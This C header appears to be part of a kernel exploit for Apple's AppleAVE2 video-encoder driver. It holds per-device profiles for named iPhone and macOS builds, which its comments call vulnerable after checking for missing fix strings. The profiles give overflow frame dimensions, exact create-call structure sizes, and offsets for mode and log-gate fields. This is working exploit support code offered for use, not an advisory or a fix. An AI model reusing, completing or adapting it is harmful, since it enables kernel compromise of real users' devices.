/*
 * ave2_profiles.h — per-OS AppleAVE2 version profiles
 *
 * Device evidence (kernelcache unpack, 2026-10-22):
 *   iPhone12,1 / iOS 26.0.1 (23A355, AppleAVE2 904.76.7)
 *     - "LRB size overflow" count=0  (no fixed assert)
 *     - "frame dimension out of range" count=0 (no fixed product clamp log)
 *     - "frame dimension is out of range" count=7 (capability gate, both builds)
 *   iPhone11,8 / iOS 26.5.2 (23F84, AppleAVE2 905.36.1)
 *     - same signature: fixed-only strings absent, capability gate present
 *   => both VULNERABLE profiles; version string is the only delta.
 *
 * create (sel1) layout — cross-validated by TWO independent capstone 反汇编s
 * (2026-10-22): iOS table check-in = 0x6f0, NOT macOS 0x920. The framework dispatcher
 * pre-checks sizes with EQUALITY, which is why every device attempt at 0x920..0x2000
 * returned 0xe00002c2 with untouched out. iOS also has log gates, but at DIFFERENT
 * offsets than macOS. All offsets are data-driven below.
 */

#ifndef AVE2_PROFILES_H
#define AVE2_PROFILES_H

#include <string.h>

typedef struct {
    const char *name;        /* human label            */
    const char *kext_ver;    /* version-gate string    */
    uint32_t    w;           /* overflow width         */
    uint32_t    h;           /* overflow height        */
    uint32_t    w_ctrl;      /* control width          */
    uint32_t    h_ctrl;      /* control height         */
    /* --- create (sel1) layout, static 反汇编 2026-10-22 --- */
    uint32_t    create_in;           /* structureInputSize (exact dispatch-table value) */
    uint32_t    create_out;          /* structureOutputSize (exact)                     */
    uint32_t    create_off_version;  /* version string slot (all layouts: +0x28)        */
    uint32_t    create_off_mode;     /* encType/mode slot: iOS +0x6e8, mac +0x918       */
    uint32_t    create_off_loglvl;   /* s32 >= 1 (iOS +0x6e0, mac +0x910)               */
    uint32_t    create_off_lognum;   /* s32 > 0  (iOS +0x6e4, mac +0x914)               */
    uint32_t    create_off_logcnt;   /* u64 monotonic, > kernel static (iOS +0x5d8, mac +0x808) */
} ave2_profile_t;

/* iOS 26.0.1 — iPhone12,1 (A13) — AppleAVE2 904.76.7
 * create table in=0x6f0 out=0x28; mode @0x6e8 in {1,2,3,4};
 * log level @0x6e0, count @0x6e4, monotonic counter @0x5d8. */
static const ave2_profile_t AVE2_PROFILE_2601 = {
    .name    = "iOS 26.0.1 iPhone12,1",
    .kext_ver = "904.76.7",
    .w       = 64656, .h = 8080,
    .w_ctrl  = 65520, .h_ctrl = 8193,
    .create_in = 0x6f0, .create_out = 0x28,
    .create_off_version = 0x28, .create_off_mode = 0x6e8,
    .create_off_loglvl = 0x6e0, .create_off_lognum = 0x6e4, .create_off_logcnt = 0x5d8,
};

/* iOS 26.5.2 — iPhone11,8 (A12) — AppleAVE2 905.36.1 (23F84)
 * assume 26.0.1-adjacent layout; verify against 23F84 kext when run there. */
static const ave2_profile_t AVE2_PROFILE_2652 = {
    .name    = "iOS 26.5.2 iPhone11,8",
    .kext_ver = "905.36.1",
    .w       = 64656, .h = 8080,
    .w_ctrl  = 65520, .h_ctrl = 8193,
    .create_in = 0x6f0, .create_out = 0x28,
    .create_off_version = 0x28, .create_off_mode = 0x6e8,
    .create_off_loglvl = 0x6e0, .create_off_lognum = 0x6e4, .create_off_logcnt = 0x5d8,
};

/* macOS 26.6.2 reference (AppleAVE2 905.40.1) — full log-gate layout, WIRE_FORMAT.md */
static const ave2_profile_t AVE2_PROFILE_MAC = {
    .name    = "macOS 26.6.2 reference (905.40.1)",
    .kext_ver = "905.40.1",
    .w       = 64656, .h = 8080,
    .w_ctrl  = 65520, .h_ctrl = 8193,
    .create_in = 0x920, .create_out = 0x28,
    .create_off_version = 0x28, .create_off_mode = 0x918,
    .create_off_loglvl = 0x910, .create_off_lognum = 0x914, .create_off_logcnt = 0x808,
};

static const ave2_profile_t *ave2_profile_all[] = {
    &AVE2_PROFILE_2601,
    &AVE2_PROFILE_2652,
    &AVE2_PROFILE_MAC,
    NULL,
};

/* Resolve profile by env AVE2_PROFILE ("26.0.1" / "26.5.2" / "mac") or explicit index. */
static const ave2_profile_t *ave2_profile_get(int idx) {
    const char *e = getenv("AVE2_PROFILE");
    if (e) {
        if (strstr(e, "26.0")) return &AVE2_PROFILE_2601;
        if (strstr(e, "26.5")) return &AVE2_PROFILE_2652;
        if (strstr(e, "mac") || strstr(e, "905")) return &AVE2_PROFILE_MAC;
    }
    if (idx == 1) return &AVE2_PROFILE_2652;
    if (idx == 2) return &AVE2_PROFILE_MAC;
    return &AVE2_PROFILE_2601;
}

#endif /* AVE2_PROFILES_H */
